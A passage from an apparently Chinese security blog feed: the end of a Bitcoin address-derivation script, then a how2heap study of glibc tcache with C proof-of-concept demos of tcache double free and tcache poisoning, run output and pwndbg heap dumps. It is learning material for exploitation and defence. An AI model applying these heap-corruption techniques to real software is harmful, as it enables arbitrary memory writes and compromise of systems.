&#x27;</span>+hexlify(Cpublic_ripemd))<br><span class="hljs-attribute">hash256</span>=hashlib.sha256()<br>hash256.update(Cpublic_ripemd)<br><span class="hljs-attribute">has1</span>=hash256.hexdigest()<br>log.success(<span class="hljs-string">&#x27;hash256 1st :&#x27;</span>+(has1))<br><br><span class="hljs-comment">#hash256</span><br><span class="hljs-attribute">hash256</span>=hashlib.sha256()<br>hash256.update(unhexlify(has1))<br><span class="hljs-attribute">has2</span>=hash256.hexdigest()<br>log.success(<span class="hljs-string">&#x27;hash256 2nd :&#x27;</span>+has2)<br><br><span class="hljs-attribute">Cpublic_ripemd</span>=Cpublic_ripemd+unhexlify(has2[:8])<br>log.success(<span class="hljs-string">&#x27;modified value : &#x27;</span>+hexlify(Cpublic_ripemd))<br><br><span class="hljs-attribute">address</span>=base58.b58encode(Cpublic_ripemd)<br>log.success(<span class="hljs-string">&#x27;Address : &#x27;</span>+(address))<br><br><br>运行结果:<br>[+] private_salt:800a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d601325f50cf<br>[+] private_key:0a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d6<br>[+] uncompressed public_key:041decbd8ff0c1b8e328bab5ea9794ebcffbcba7f8e8c1e604a193bea543ef13160cfafec08b79973f519843ec8f724302f454dba89224389c42e8fb3b4444148b<br>[+] compressed public_key:031decbd8ff0c1b8e328bab5ea9794ebcffbcba7f8e8c1e604a193bea543ef1316<br>[+] compressed public_key hash256 :08fdc7cea4b50c4280e33bfe7ba7a0d19d8235cbc94a78e1e977bdd13ffbc5db<br>[+] compressed public_key hash &amp; ripmed :ff452ce82e7b9e157e0f7abd188d75ab698c74cf<br>[+] <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;\x00&quot;</span>: 00ff452ce82e7b9e157e0f7abd188d75ab698c74cf<br>[+] hash256 1st :ecfc308eb6cb6f444711fe9d16d35713e46a2dda0c2185e550c6fee0a9587e96<br>[+] hash256 2nd :597599af8a17b0e24787ba83210b8636a7abe91814eb6b24568d09f3c324fa19<br>[+] modified value : 00ff452ce82e7b9e157e0f7abd188d75ab698c74cf597599af<br>[+]<span class="hljs-built_in"> Address </span>: 1QGkBJve12oY6CQTKfvoTZv26YvUi6ZL4e<br></code></pre></td></tr></table></figure><p>至此我们的计算就结束啦,:)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结计划八</title>
    <link href="/2020/02/20/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AB/"/>
    <url>/2020/02/20/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>终于轮到了glibc2.26，本节包括tcache_dup,tcache_poisoning,tcache_house_of_spirit,house_of_spirit,house_of_botcake</p></blockquote><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn<span class="hljs-regexp">/linux/g</span>libc-heap<span class="hljs-regexp">/tcache_attack-zh/</span><br>https:<span class="hljs-regexp">//</span>hackmd.io<span class="hljs-regexp">/@DIuvbu1vRU2C5FwWIMzZ_w/</span>HkyVl98b8<br></code></pre></td></tr></table></figure><h1 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>glibc版本大于2.26之后，引入了tcache这一新机制，也完美展示了如何通过牺牲安全性来提升速度,当然可能也因为太不安全了,在2.29中就新增了保护机制,比如本文中的tcache double free就在2.29中被命运扼住了咽喉,国内比赛2.29的题目比较少,但是国际上很多比赛早已引入2.29的题目</p><p>在分析漏洞利用demo时，我们先来看看这个tcache机制，这里也引入一篇之前总结的<a href="https://nightrainy.github.io/2019/07/11/tcache%E6%9C%BA%E5%88%B6%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/">文章</a><br>，还有ctfwiki的关于tcache的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">总结</a></p><p>有不想跳转的同学，我在这里也做一个解释</p><p>要注意的是新引入的tcache的优先级是高于fastbin的</p><p>PS：calloc是不会从tcache中拿chunk的</p><h3 id="关于tcache"><a href="#关于tcache" class="headerlink" title="关于tcache"></a>关于tcache</h3><ol><li>tcache最多由64个bins链接而成，而每一个bins中最多放7个chunk</li><li>64位机中最小size是24字节,每16字节递增一次,而32位机上为12字节,每8字节递增一次</li><li>这也就意味着我们最大的chunk必须小于0x410,也就是我们申请的size要小于0x408(64位机上)</li></ol><h3 id="新的结构体"><a href="#新的结构体" class="headerlink" title="新的结构体"></a>新的结构体</h3><p>在更新版本的时候，引入了两个新的结构体:tcahce_entry和tcache_perthread_struct,两个结构体的定义如下:</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs d">+<span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">+   the chunk is stored in the per-thread cache.  */</span><br>+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> tcache_entry<br>+&#123;<br>+  <span class="hljs-keyword">struct</span> tcache_entry *next;<br>+&#125; tcache_entry;<br>+<br>+<span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">+   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">+   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">+   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">+   time), this is for performance reasons.  */</span><br>+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> tcache_perthread_struct<br>+&#123;<br>+  <span class="hljs-built_in">char</span> counts[TCACHE_MAX_BINS];<br>+  tcache_entry *entries[TCACHE_MAX_BINS];<br>+&#125; tcache_perthread_struct;<br>+<br>+<span class="hljs-keyword">static</span> <span class="hljs-keyword">__thread</span> <span class="hljs-built_in">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br>+<span class="hljs-keyword">static</span> <span class="hljs-keyword">__thread</span> tcache_perthread_struct *tcache = NULL;<br></code></pre></td></tr></table></figure><p>从定义中可以看到，我们的tcache_entry为单链表结构</p><p>而tcache_perthread_struct为tcahch机制的主体，一个链表中内存块的最大数量为TCACHE_MAX_BINS即64</p><h3 id="新的函数"><a href="#新的函数" class="headerlink" title="新的函数"></a>新的函数</h3><p>于此同时，也新加了两个函数,tcache_get 和tcache_put</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xl">+<span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">+   for more chunks.  */</span><br>+static void<br>+tcache_put (mchunkptr chunk, size_t tc_idx)<br>+&#123;<br>+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>+  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>+  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span> = tcache-&gt;</span>entries[tc_idx];<br>+  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>entries[tc_idx] = e;<br>+  ++(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>+&#125;<br>+<br>+<span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">+   available chunks to remove.  */</span><br>+static void *<br>+tcache_get (size_t tc_idx)<br>+&#123;<br>+  <span class="hljs-function"><span class="hljs-title">tcache_entry</span> *e = tcache-&gt;</span>entries[tc_idx];<br>+  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>+  <span class="hljs-function"><span class="hljs-title">assert</span> (tcache-&gt;</span>entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>+  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">entries</span>[tc_idx] = e-&gt;</span>next;<br>+  --(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>+  return (void *) e;<br>+&#125;<br>+<br></code></pre></td></tr></table></figure><p>从这两个函数中也可以看到开发者希望调用的人确保参数合法，这就2333<br>我们可以看到在tcache_get中，我们唯一需要保证的就是tcache-&gt;entries[tc_idx] &#x3D; e-&gt;next，这也就意味着安全性的急剧丧失</p><p>下面我们就直接看一下源代码</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>因为十分简单，所以我们简单一些</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//本demo是一个简单的利用tcache的double-free attack</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating buffer.\n&quot;</span>);<br><span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(8): %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing twice...\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">This file demonstrates a simple<span class="hljs-built_in"> double-free </span>attack with tcache.<br>Allocating buffer.<br>malloc(8): 0x56028230f260<br>Freeing twice...<br>Now the free list has [ 0x56028230f260, 0x56028230f260 ].<br>Next allocated buffers will be same: [ 0x56028230f260, 0x56028230f260 ].<br></code></pre></td></tr></table></figure><h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>这里就直接显示free后的状态吧</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x20 [  2]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x555555756260 ◂— 0x555555756260 /* &#x27;`buUUU&#x27; */</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>因为没有检查，因此可以看到我们连续free两次chunk就构造了一个循环</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们知道在Fastbin attack的时候我们是不能依次free两次同一块chunk的，但是tcache可以</p><p>这是为什么呢？原因也很简单，从tcache_put函数可以看出，它几乎没有设置任何检查，也就意味着我们无需做任何事就可以对同一个chunk进行多次的free，相比fastbin_dup来说，tcache_dup的利用更加的简单了</p><p>然后我们再malloc两次就可以得到同一块内存的chunk</p><p>对本程序而言，程序先malloc了一个chunk a(size&#x3D;8)</p><p>然后连续Freee两次chunk a,此时在free list中就会链入两次chunk a,</p><p>这个时候我们再申请两次chunk就可以将两次的chunk a全部拿出来了</p><h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h1><h2 id="序-1"><a href="#序-1" class="headerlink" title="序"></a>序</h2><p>对于tcache来说，我们不需要像fastbin那样伪造一个size符合要求的地址来任意malloc，我们只需要直接覆盖fd指针就可以了</p><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//此demo的效果就是返回一个指向任意地址的指针，与fastbin corruption攻击极其相似（本例返回的地址是一个栈地址）</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span><br>       <span class="hljs-string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span><br>       <span class="hljs-string">&quot;The attack is very similar to fastbin corruption attack.\n\n&quot;</span>);<br><br><span class="hljs-type">size_t</span> stack_var;<br>    <span class="hljs-comment">//我们想要返回的地址是stack_var</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="hljs-type">char</span> *)&amp;stack_var);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating 1 buffer.\n&quot;</span>);<br><span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the buffer...\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, a);<br>    <span class="hljs-comment">//我们通过覆写第一个chunk的fd指针，使其指向我们的栈地址</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span><br><span class="hljs-string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">intptr_t</span>), a, &amp;stack_var);<br>a[<span class="hljs-number">0</span>] = (<span class="hljs-type">intptr_t</span>)&amp;stack_var;<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>));<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);<br><br><span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(128): %p\n&quot;</span>, b);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;We got the control\n&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">This <span class="hljs-built_in">file</span> demonstrates <span class="hljs-keyword">a</span> simple tcache poisoning attack <span class="hljs-keyword">by</span> tricking malloc <span class="hljs-keyword">into</span><br>returning <span class="hljs-keyword">a</span> pointer <span class="hljs-built_in">to</span> <span class="hljs-keyword">an</span> arbitrary location (<span class="hljs-keyword">in</span> this <span class="hljs-keyword">case</span>, <span class="hljs-keyword">the</span> stack).<br>The attack is very similar <span class="hljs-built_in">to</span> fastbin corruption attack.<br><br>The address we want malloc() <span class="hljs-built_in">to</span> <span class="hljs-literal">return</span> is <span class="hljs-number">0x7ffeeef34a50</span>.<br>Allocating <span class="hljs-number">1</span> buffer.<br>malloc(<span class="hljs-number">128</span>): <span class="hljs-number">0x5560af76b260</span><br>Freeing <span class="hljs-keyword">the</span> buffer...<br>Now <span class="hljs-keyword">the</span> tcache list has [ <span class="hljs-number">0x5560af76b260</span> ].<br>We overwrite <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-number">8</span> <span class="hljs-keyword">bytes</span> (fd/next pointer) <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> data <span class="hljs-keyword">at</span> <span class="hljs-number">0x5560af76b260</span><br><span class="hljs-built_in">to</span> point <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> location <span class="hljs-built_in">to</span> control (<span class="hljs-number">0x7ffeeef34a50</span>).<br><span class="hljs-number">1</span>st malloc(<span class="hljs-number">128</span>): <span class="hljs-number">0x5560af76b260</span><br>Now <span class="hljs-keyword">the</span> tcache list has [ <span class="hljs-number">0x7ffeeef34a50</span> ].<br><span class="hljs-number">2</span>nd malloc(<span class="hljs-number">128</span>): <span class="hljs-number">0x7ffeeef34a50</span><br>We got <span class="hljs-keyword">the</span> control<br></code></pre></td></tr></table></figure><h2 id="关键代码调试"><a href="#关键代码调试" class="headerlink" title="关键代码调试"></a>关键代码调试</h2><p>这次将断点下在了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">15</span> <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>► <span class="hljs-number">16</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;malloc(128): %p\n&quot;</span>, a);<br><br>  <span class="hljs-number">18</span> <span class="hljs-built_in">free</span>(a);<br>  <span class="hljs-number">19</span> <br>► <span class="hljs-number">20</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, a);<br><br>► <span class="hljs-number">23</span> a[<span class="hljs-number">0</span>] = (<span class="hljs-type">intptr_t</span>)&amp;stack_var;<br><br>  <span class="hljs-number">28</span> <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br>► <span class="hljs-number">29</span> <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2nd malloc(128): %p\n&quot;</span>, b);<br></code></pre></td></tr></table></figure><p>我们直接运行就好，首先我们申请了chunk a,此时的堆是这样的</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x555555756000</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">593</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x555555756250</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">145</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x5555557562e0</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">134433</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时可能有同学会比较疑惑，我们明明只malloc了一个size为128的chunk为什么最前面有一个大小为0x251的chunk嘞,这个其实就是tcache_perthread_struct这个用来管理tcache的结构体</p><p>好了，解决了这个问题我们就继续下一步吧，让我们free掉a</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x90 [  1]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x555555756260 ◂— 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>可以看到此时我们的chunk a已经被放到了tcache中</p><p>此时我们所需要做的就极其简单了，因为tcache没有检查size是否符合规格这一设定，因此我们直接覆写chunk a 的fd指针，让他链在我们的free list中</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; bins<br>tcachebins<br><span class="hljs-number">0</span>x90 [  <span class="hljs-number">1</span>]: <span class="hljs-number">0</span>x5<span class="hljs-number">55555756260</span> —▸ <span class="hljs-number">0</span>x7fffffffe5c0 ◂— ...<br>fastbins<br><span class="hljs-number">0</span>x20: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x30: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x40: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x50: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x60: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x70: <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span>x80: <span class="hljs-number">0</span>x0<br>unsortedbin<br>all: <span class="hljs-number">0</span>x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x<span class="hljs-number">555555756250</span><br><span class="hljs-number">0</span>x<span class="hljs-number">555555756250</span>:<span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><span class="hljs-number">0</span>x00000<span 